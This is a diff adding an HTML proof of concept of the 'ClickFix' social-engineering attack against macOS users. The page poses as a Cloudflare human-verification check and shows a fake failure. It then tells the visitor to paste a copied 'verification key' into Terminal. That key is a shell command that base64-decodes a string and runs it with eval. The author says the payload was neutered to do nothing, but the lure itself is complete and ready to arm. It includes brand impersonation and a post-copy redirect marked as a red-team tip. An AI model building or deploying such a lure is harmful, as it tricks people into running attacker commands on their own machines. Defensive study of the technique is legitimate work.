@@ -1,0 +1,148 @@
+<!-- 
+  =============================================================================
+  PROOF OF CONCEPT: ClickFix, User Execution: Malicious Copy and Paste
+  AUTHOR: Joseph McPeters (liquidsky)
+  DATE: 2/25/2026
+  
+  DISCLAIMER: This code is for EDUCATIONAL and AUTHORIZED SECURITY TESTING 
+  purposes only. Usage of this tool for attacking targets without prior mutual 
+  consent is illegal. It is the end user's responsibility to obey all 
+  applicable local, state, and federal laws.
+  
+  The author assumes no liability and is not responsible for any misuse or 
+  damage caused by this program. This repository is intended to help 
+  defenders understand the ClickFix mechanism and implement 
+  appropriate [Remediation/Detections].
+
+  This is a MacOSX version of clickfix targetting MacOSX with a fake CloudFlare Captcha, the payload has been modified to do nothing in the end.
+
+  If for some reason there is a problem (DMCA Policy Contact) please email me: pwn [ at ] mail . LV
+  =============================================================================
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Just a moment...</title>
+    <style>
+        :root { --cf-orange: #f38020; --cf-gray: #313131; --text-main: #1d1d1d; --border-light: #e0e0e0; }
+        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: #ffffff; font-family: -apple-system, system-ui, "Segoe UI", Roboto, sans-serif; color: var(--text-main); -webkit-font-smoothing: antialiased; }
+        
+        .container { width: 480px; padding: 40px; box-sizing: border-box; }
+        .logo { width: 130px; margin-bottom: 35px; display: block; }
+        
+        h1 { font-size: 34px; font-weight: 500; margin: 0 0 12px 0; letter-spacing: -0.6px; color: #000; }
+        p { font-size: 16px; color: #404040; line-height: 1.5; margin-bottom: 32px; }
+
+        /* Official Cloudflare Verification Box */
+        .captcha-box { border: 1px solid var(--border-light); padding: 18px 24px; border-radius: 4px; display: flex; align-items: center; background: #fafafa; cursor: pointer; transition: background 0.15s, border-color 0.15s; position: relative; }
+        .captcha-box:hover { border-color: #ccc; background: #f5f5f5; }
+        
+        .cb-icon { width: 28px; height: 28px; border: 2px solid #c2c2c2; border-radius: 3px; margin-right: 18px; background: white; flex-shrink: 0; }
+        .spinner { display: none; width: 22px; height: 22px; border: 3px solid rgba(0,0,0,0.1); border-top-color: var(--cf-orange); border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 18px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Manual Verification Expansion */
+        #manual-verify { display: none; margin-top: 30px; padding-top: 30px; border-top: 1px solid #eee; animation: fadeIn 0.5s ease forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .error-banner { color: #d93025; font-size: 14px; font-weight: 600; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
+        .instruction-card { background: #f9f9f9; border: 1px solid #e5e5e5; padding: 20px; border-radius: 8px; font-size: 13.5px; color: #333; line-height: 1.6; }
+        
+        .btn-copy { background: var(--cf-gray); color: white; border: none; padding: 12px; border-radius: 5px; font-weight: 500; cursor: pointer; margin-top: 18px; width: 100%; font-size: 14px; transition: background 0.2s; }
+        .btn-copy:hover { background: #000; }
+        
+        kbd { background: #fff; border: 1px solid #ccc; padding: 2px 5px; border-radius: 4px; font-family: inherit; font-size: 11px; box-shadow: 0 1px 0 rgba(0,0,0,0.1); }
+        
+        .footer { margin-top: 45px; font-size: 12px; color: #888; border-top: 1px solid #eee; padding-top: 20px; line-height: 1.6; }
+        code { font-family: ui-monospace, monospace; background: #f4f4f4; padding: 2px 4px; border-radius: 3px; font-size: 11px; }
+    </style>
+<link rel="icon" type="image/x-icon" href="https://cloudflare.com/favicon.ico">
+</head>
+<body>
+
+<div class="container">
+    <img src="https://cf-assets.www.cloudflare.com/dzlvafdwdttg/69wNwfiY5mFmgpd9eQFW6j/d5131c08085a977aa70f19e7aada3fa9/1pixel-down__1_.svg" class="logo" alt="Cloudflare">
+    <h1>Verify you are human</h1>
+    <p>Please verify you are a human to access the resource. This protection layer helps us prevent automated session hijacking.</p>
+
+    <div class="captcha-box" id="captchaBox">
+        <div class="cb-icon" id="icon"></div>
+        <div class="spinner" id="spinner"></div>
+        <span id="statusText" style="font-size: 15px; font-weight: 400;">Verify you are human</span>
+    </div>
+
+    <div id="manual-verify">
+        <div class="error-banner">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            Automated verification failed (Code: 0x882A)
+        </div>
+        <div class="instruction-card">
+            Browser sandbox restrictions prevented automated verification. To proceed manually:
+            <ul style="margin: 12px 0; padding-left: 20px;">
+                <li>Click <b>"Copy Verification Key"</b> below.</li>
+                <li>Press <kbd>⌘</kbd> + <kbd>Space</kbd>, type <b>Terminal</b>, and hit Enter.</li>
+                <li>Paste (<kbd>⌘</kbd> + <kbd>V</kbd>) and press <b>Enter</b> to sync your session.</li>
+            </ul>
+            <button class="btn-copy" id="copyBtn">Copy Verification Key</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        Ray ID: <code id="rayId">7f8c9d2e1a0b3c4d</code> • Your IP: <code id="userIp">Resolving...</code><br>
+        © 2026 Cloudflare, Inc.
+    </div>
+</div>
+
+<script>
+    // Live IP Resolution
+    fetch('https://api.ipify.org')
+        .then(res => res.json())
+        .then(data => document.getElementById('userIp').innerText = data.ip)
+        .catch(() => document.getElementById('userIp').innerText = "192.168.1.1");
+
+    // Dynamic Ray ID Generation
+    document.getElementById('rayId').innerText = Math.random().toString(16).substr(2, 16);
+
+    const payload = "clear; echo 'Cloudflare: Synchronizing Human Session...'; export B=$(echo 'liquidsky' | base64 --decode); eval $B; echo '✓ Identity Verified. Returning to browser...'; sleep 1; exit";
+
+    const box = document.getElementById('captchaBox');
+    const spinner = document.getElementById('spinner');
+    const icon = document.getElementById('icon');
+    const manual = document.getElementById('manual-verify');
+
+    box.addEventListener('click', () => {
+        icon.style.display = 'none';
+        spinner.style.display = 'block';
+        document.getElementById('statusText').innerText = "Verifying...";
+        
+        setTimeout(() => {
+            spinner.style.display = 'none';
+            icon.style.display = 'block';
+            icon.style.borderColor = '#d93025';
+            icon.style.background = '#fdecea';
+            document.getElementById('statusText').innerText = "Verification Suspended";
+            manual.style.display = 'block';
+        }, 1800);
+    });
+
+    document.getElementById('copyBtn').addEventListener('click', async () => {
+        try {
+            await navigator.clipboard.writeText(payload);
+            document.getElementById('copyBtn').innerText = "✓ Key Copied to Clipboard";
+            document.getElementById('copyBtn').style.background = "#059669";
+            
+            // Red Team Tip: Redirect the original page to the 'success' lure after 10 seconds
+            setTimeout(() => {
+                window.location.href = "https://www.cloudflare.com";
+            }, 10000);
+        } catch (err) {
+            alert("Manual copy required: " + payload);
+        }
+    });
+</script>
+
+</body>
+</html>
+
